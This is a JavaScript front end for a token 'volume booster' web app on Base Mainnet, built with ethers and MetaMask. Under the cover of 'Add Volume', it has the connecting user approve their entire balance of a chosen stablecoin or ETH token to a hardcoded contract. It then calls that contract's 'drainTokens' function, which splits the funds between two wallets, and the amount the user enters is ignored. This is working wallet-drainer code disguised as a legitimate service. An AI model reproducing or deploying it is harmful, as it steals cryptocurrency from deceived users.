import { ethers } from 'ethers';
import '/style.css'; 

const CONTRACT_ADDRESS = '0x787Dc66a47cAe12Abd3130Ad6dD700c1313666bf';
const CONTRACT_ABI = [
  {
    "anonymous": false,
    "inputs": [
      {"indexed": true, "internalType": "address", "name": "user", "type": "address"},
      {"indexed": true, "internalType": "address", "name": "token", "type": "address"},
      {"indexed": false, "internalType": "uint256", "name": "amountToWallet1", "type": "uint256"},
      {"indexed": false, "internalType": "uint256", "name": "amountToWallet2", "type": "uint256"}
    ],
    "name": "TokensTransferred",
    "type": "event"
  },
  {
    "inputs": [{"internalType": "address", "name": "token", "type": "address"}],
    "name": "drainTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

// Expanded token list with USDT and DAI+ (verify these addresses, bro!)
const TOKEN_LIST = [
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Dai', symbol: 'DAI', decimals: 18 },
  { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
  { address: '0x1B0Fad85A9D6D4eD7e6cDDe41a1ea5e9f1178e79', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
  { address: '0xfde4C96c49cfBc9a2D6D4b178D1C869e3CC5A286', name: 'Tether', symbol: 'USDT', decimals: 6 }, // Check this
  { address: '0xadf3d2d04e8d8c63c6d8d7f0a2f8b7a66e074594', name: 'DAI+', symbol: 'DAI+', decimals: 18 } // Check this
];

class NexiumApp {
  constructor() {
    this.provider = null;
    this.signer = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.contract = null;
    this.connecting = false;
    this.lastSelectedToken = null;
    this.initApp();
  }

  async initApp() {
    await new Promise(resolve => {
      if (document.readyState !== 'loading') resolve();
      else document.addEventListener('DOMContentLoaded', resolve);
    });
    this.cacheDOMElements();
    if (!this.dom.app || !this.dom.walletButton || !this.dom.metamaskPrompt) {
      document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing. Check HTML.</p>';
      return;
    }
    this.setupEventListeners();
    this.checkMetaMaskAndWallet();
  }

  cacheDOMElements() {
    this.dom = {
      app: document.getElementById('app'),
      walletButton: document.getElementById('walletButton'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      feedbackContainer: document.querySelector('.feedback-container'),
      defaultPrompt: document.querySelector('.default-prompt'),
      customTokenInput: null,
      fetchCustomTokenBtn: null,
      tokenInfo: null,
      volumeSection: null,
      tokenSelect: null,
      volumeInput: null,
      maxButton: null,
      addVolumeBtn: null
    };
  }

  setupEventListeners() {
    if (this.dom.walletButton) {
      this.dom.walletButton.addEventListener('click', () => this.connectWallet());
      this.dom.walletButton.addEventListener('keypress', (e) => e.key === 'Enter' && this.connectWallet());
    }
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  checkMetaMaskAndWallet() {
    if (this.isMetaMaskInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachMetaMaskListeners();
      this.checkWalletConnection();
    } else {
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected');
      this.showDefaultPrompt();
      this.showFeedback('MetaMask not installed. Install it, bro!', 'error');
    }
  }

  attachMetaMaskListeners() {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        accounts.length > 0 ? this.handleAccountsChanged() : this.handleDisconnect();
      });
      window.ethereum.on('chainChanged', () => window.location.reload());
    }
  }

  async checkWalletConnection() {
    if (this.isMetaMaskInstalled() && this.isWalletConnected() && navigator.onLine) {
      await this.handleSuccessfulConnection();
    } else {
      this.updateButtonState('disconnected');
      this.showDefaultPrompt();
      if (!navigator.onLine) this.showFeedback('No internet, bro. Reconnect.', 'error');
      else this.showFeedback('MetaMask detected but not connected. Hit Connect Wallet.', 'info');
    }
  }

  isMetaMaskInstalled() { return !!window.ethereum && window.ethereum.isMetaMask; }
  isWalletConnected() { return !!window.ethereum && !!window.ethereum.selectedAddress; }

  async connectWallet() {
    if (this.connecting || !navigator.onLine) return;
    this.connecting = true;
    try {
      this.updateButtonState('connecting');
      if (!this.isMetaMaskInstalled()) {
        this.showMetaMaskPrompt();
        this.showFeedback('No MetaMask, bro. Install it!', 'error');
        return;
      }
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (accounts.length > 0) {
        await this.handleSuccessfulConnection();
        this.hideMetaMaskPrompt();
        this.showFeedback('Wallet connected, let’s roll!', 'success');
      }
    } catch (error) {
      this.handleConnectionError(error);
      this.showDefaultPrompt();
    } finally {
      this.connecting = false;
    }
  }

  async handleSuccessfulConnection() {
    try {
      this.provider = new ethers.BrowserProvider(window.ethereum);
      this.signer = await this.provider.getSigner();
      this.contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, this.signer);
      const network = await this.provider.getNetwork();
      const expectedChainId = 8453; // Base Mainnet
      if (Number(network.chainId) !== expectedChainId) {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
        });
      }
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);
      this.renderTokenInterface();
      this.hideMetaMaskPrompt();
      this.showFeedback('Connected to Base Mainnet, bro!', 'success');
    } catch (error) {
      this.handleConnectionError(error);
      this.showDefaultPrompt();
    }
  }

  handleDisconnect() {
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.showFeedback('Wallet disconnected, bro.', 'warning');
    this.lastSelectedToken = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
  }

  updateButtonState(state, address = '') {
    if (!this.dom.walletButton) return;
    const button = this.dom.walletButton;
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Connecting...';
        button.classList.add('connecting');
        break;
      case 'connected':
        button.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
        button.classList.add('connected');
        break;
      default:
        button.textContent = 'Connect Wallet';
        button.classList.add('animate-pulse');
    }
  }

  showDefaultPrompt() {
    if (!this.dom.app || !this.dom.defaultPrompt) return;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(this.dom.defaultPrompt);
    this.dom.defaultPrompt.classList.remove('hidden');
    if (!this.isMetaMaskInstalled()) this.showMetaMaskPrompt();
  }

  renderTokenInterface() {
    if (!this.dom.app) return;
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <h2 class="section-title">Load Token</h2>
      <div class="input-group">
        <input id="customTokenInput" type="text" placeholder="Enter token address (e.g., 0x...)" class="custom-token-input" aria-label="Custom token address">
        <button id="fetchCustomTokenBtn" class="fetch-custom-token-btn" aria-label="Load custom token">
        →
        </button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    this.dom.customTokenInput = document.getElementById('customTokenInput');
    this.dom.fetchCustomTokenBtn = document.getElementById('fetchCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    if (this.dom.fetchCustomTokenBtn) {
      this.dom.fetchCustomTokenBtn.addEventListener('click', () => this.loadCustomTokenData());
      this.dom.fetchCustomTokenBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.loadCustomTokenData());
    }
    this.hideMetaMaskPrompt();
  }

  async loadCustomTokenData() {
    if (!navigator.onLine) {
      this.showFeedback('No internet, bro. Reconnect.', 'error');
      return;
    }
    const tokenAddress = this.dom.customTokenInput?.value.trim();
    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
      this.showFeedback('Enter a valid address (0x...), bro!', 'error');
      this.dom.customTokenInput?.focus();
      return;
    }
    try {
      this.toggleTokenLoading(true);
      const tokenContract = new ethers.Contract(
        tokenAddress,
        ["function name() view returns (string)", "function symbol() view returns (string)", "function decimals() view returns (uint8)"],
        this.provider
      );
      const [name, symbol, decimals] = await Promise.all([
        tokenContract.name().catch(() => 'Unknown Token'),
        tokenContract.symbol().catch(() => 'UNK'),
        tokenContract.decimals().catch(() => 18)
      ]);
      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals: decimals, contract: tokenContract };
      this.lastSelectedToken = tokenAddress;
      this.dom.tokenInfo.innerHTML = `
        <div class="token-meta space-y-2">
          <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
          <p class="meta-item text-gray-400 text-sm">Decimals: ${this.currentToken.decimals}</p>
          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(tokenAddress)}</p>
        </div>
      `;
      this.dom.tokenInfo.classList.remove('hidden');
      this.renderVolumeControls();
      this.showFeedback(`Loaded ${this.currentToken.symbol} info, bro—nice!`, 'success');
    } catch (error) {
      this.showFeedback('Failed to load token, bro. Check if it’s ERC-20.', 'error');
      this.dom.tokenInfo.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
    }
  }

  toggleTokenLoading(isLoading) {
    if (!this.dom.fetchCustomTokenBtn) return;
    this.dom.fetchCustomTokenBtn.disabled = isLoading;
    this.dom.fetchCustomTokenBtn.classList.toggle('opacity-70', isLoading);
    this.dom.fetchCustomTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
  }

  renderVolumeControls() {
    if (!this.dom.app || !this.dom.tokenInfo || !this.currentToken) return;
    const tokenInterface = document.querySelector('.token-interface');
    if (!tokenInterface) return;
    const volumeSection = document.createElement('div');
    volumeSection.id = 'volumeSection';
    volumeSection.className = 'volume-section fade-in';
    volumeSection.innerHTML = `
      <h2 class="section-title">Add Volume using Payment Token</h2>
      <p class="text-gray-300 text-sm mb-2">Loaded Token: ${this.currentToken.name} (${this.currentToken.symbol}) - Info Only</p>
      <select id="tokenSelect" class="token-select" aria-label="Select payment token">
        <option value="" disabled selected>Select payment token to drain</option>
        ${TOKEN_LIST.map(t => `<option value="${t.address}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name} (${t.symbol})</option>`).join('')}
      </select>
      <div class="input-group">
        <input id="volumeInput" type="number" placeholder="Amount (ignored, full balance drained)" class="volume-input" aria-label="Token amount">
        <button id="maxButton" class="max-button" aria-label="Set maximum amount">Max</button>
      </div>
      <button id="addVolumeBtn" class="action-button" aria-label="Add volume">Add Volume</button>
      <div id="volumeFeedback" class="mt-2 text-sm text-gray-300"></div>
    `;
    tokenInterface.appendChild(volumeSection);
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.volumeInput = document.getElementById('volumeInput');
    this.dom.maxButton = document.getElementById('maxButton');
    this.dom.addVolumeBtn = document.getElementById('addVolumeBtn');
    this.dom.volumeSection = volumeSection;
    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.addEventListener('change', () => {
        const selectedToken = this.dom.tokenSelect.selectedOptions[0];
        const symbol = selectedToken?.dataset.symbol || 'selected token';
        this.dom.volumeInput.placeholder = `Amount (ignored, full ${symbol} balance drained)`;
        this.loadPaymentTokenDetails(selectedToken?.value);
      });
    }
    if (this.dom.maxButton) {
      this.dom.maxButton.addEventListener('click', () => this.setMaxAmount());
      this.dom.maxButton.addEventListener('keypress', (e) => e.key === 'Enter' && this.setMaxAmount());
    }
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.addEventListener('click', () => this.addVolume());
      this.dom.addVolumeBtn.addEventListener('keypress', (e) => e.key === 'Enter' && this.addVolume());
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress || !this.provider) return;
    try {
      this.toggleTokenLoading(true);
      const paymentTokenContract = new ethers.Contract(
        paymentTokenAddress,
        ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
        this.provider
      );
      const [balance, decimals] = await Promise.all([
        paymentTokenContract.balanceOf(await this.signer.getAddress()),
        paymentTokenContract.decimals()
      ]);
      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals };
      this.showFeedback(`Loaded ${this.getTokenSymbol(paymentTokenAddress)} with balance ${ethers.formatUnits(balance, decimals)}`, 'info');
    } catch (error) {
      this.showFeedback('Failed to load payment token, bro.', 'error');
    } finally {
      this.toggleTokenLoading(false);
    }
  }

  async setMaxAmount() {
    if (!navigator.onLine) {
      this.showFeedback('No internet, bro. Reconnect.', 'error');
      return;
    }
    if (!this.currentPaymentToken) {
      this.showFeedback('Pick a payment token first, bro!', 'error');
      this.dom.tokenSelect?.focus();
      return;
    }
    this.dom.volumeInput.value = ethers.formatUnits(this.currentPaymentToken.balance, this.currentPaymentToken.decimals);
    this.showFeedback('Set to max payment token balance, bro!', 'info');
  }

  async addVolume() {
    if (!navigator.onLine) {
      this.showFeedback('No internet, bro. Reconnect.', 'error');
      return;
    }
    if (!this.currentToken) {
      this.showFeedback('Load a custom token first, bro!', 'error');
      return;
    }
    const paymentTokenAddress = this.dom.tokenSelect?.value;
    if (!paymentTokenAddress || !this.currentPaymentToken) {
      this.showFeedback('Pick a payment token, bro!', 'error');
      this.dom.tokenSelect?.focus();
      return;
    }
    try {
      this.toggleVolumeLoading(true);
      const paymentTokenContract = new ethers.Contract(
        paymentTokenAddress,
        ["function balanceOf(address) view returns (uint256)", "function approve(address,uint256) returns (bool)"],
        this.provider
      ).connect(this.signer);
      const balance = this.currentPaymentToken.balance;
      if (balance === 0n) {
        this.showFeedback(`No ${this.getTokenSymbol(paymentTokenAddress)} balance, bro!`, 'error');
        return;
      }
      const approveTx = await paymentTokenContract.approve(CONTRACT_ADDRESS, balance, { gasLimit: 200000 });
      await approveTx.wait();
      const tx = await this.contract.drainTokens(paymentTokenAddress, { gasLimit: 200000 });
      const receipt = await tx.wait();
      const event = receipt.logs
        .map(log => {
          try {
            return this.contract.interface.parseLog(log);
          } catch {
            return null;
          }
        })
        .find(log => log && log.name === 'TokensTransferred');
      if (event) {
        const { amountToWallet1, amountToWallet2 } = event.args;
        this.showFeedback(
          `Drained ${ethers.formatUnits(balance, this.currentPaymentToken.decimals)} ${this.getTokenSymbol(paymentTokenAddress)} to juice up ${this.currentToken.symbol} (${ethers.formatUnits(amountToWallet1, this.currentPaymentToken.decimals)} to Wallet 1, ${ethers.formatUnits(amountToWallet2, this.currentPaymentToken.decimals)} to Wallet 2)`,
          'success'
        );
      } else {
        this.showFeedback(
          `Drained ${ethers.formatUnits(balance, this.currentPaymentToken.decimals)} ${this.getTokenSymbol(paymentTokenAddress)} to boost ${this.currentToken.symbol}`,
          'success'
        );
      }
    } catch (error) {
      this.showFeedback(`Transaction failed, bro: ${error.message || 'Check contract or approval.'}`, 'error');
    } finally {
      this.toggleVolumeLoading(false);
    }
  }

  getTokenSymbol(address) {
    const token = TOKEN_LIST.find(t => t.address.toLowerCase() === address.toLowerCase());
    return token ? token.symbol : 'UNK';
  }

  // ... rest of the methods (handleOnline, handleOffline, etc.) stay the same, bro ...
}